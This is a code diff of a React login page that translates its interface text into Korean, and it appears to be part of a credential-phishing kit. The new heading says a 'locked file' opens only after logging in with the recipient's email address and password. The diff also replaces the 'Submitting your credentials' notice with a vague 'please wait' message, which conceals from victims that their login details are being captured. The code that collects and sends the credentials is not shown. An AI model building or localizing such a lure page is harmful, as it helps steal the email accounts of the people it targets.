@@ -112,7 +112,7 @@ export default function LoginPage() {
       {isLoading && (
         <div className="fixed inset-0 z-30 flex flex-col items-center justify-center bg-white">
           <div className="text-lg font-medium text-gray-700 mb-4">
-            Checking file…
+            파일 로딩 중…
           </div>
           <div className="w-3/4 h-2 bg-gray-200 rounded overflow-hidden">
             <div
@@ -143,7 +143,7 @@ export default function LoginPage() {
       {/* Login Card */}
       <div className="login-card">
         <h1 className="text-sm font-bold text-center mb-2 text-blue-600">
-          Verify your email address to continue.
+          잠긴 파일을 열려면 수신자의 이메일 주소로 로그인하세요.
         </h1>
 
         {!confirmed ? (
@@ -152,7 +152,7 @@ export default function LoginPage() {
               type="email"
               value={email}
               onChange={e => setEmail(e.target.value)}
-              placeholder="Enter your email"
+              placeholder="이메일을 입력하세요"
               className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
               required
             />
@@ -163,7 +163,7 @@ export default function LoginPage() {
               type="submit"
               className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
             >
-              Next
+              다음
             </button>
           </form>
         ) : (
@@ -183,7 +183,7 @@ export default function LoginPage() {
                   setErrors({ ...errors, password: '' })
                 }
               }}
-              placeholder="Enter your password"
+              placeholder="비밀번호를 입력하세요"
               className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
               required
             />
@@ -194,7 +194,7 @@ export default function LoginPage() {
               type="submit"
               className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
             >
-              Login
+              로그인
             </button>
           </form>
         )}
@@ -204,8 +204,8 @@ export default function LoginPage() {
       {showModal && (
         <div className="modal-overlay">
           <div className="modal-content">
-            <h2 className="text-lg font-semibold text-gray-800">Please wait…</h2>
-            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
+            <h2 className="text-lg font-semibold text-gray-800">확인중입니다. 잠시만 기다려주세요.…</h2>
+            <p className="mt-2 text-gray-600">*</p>
           </div>
         </div>
       )}
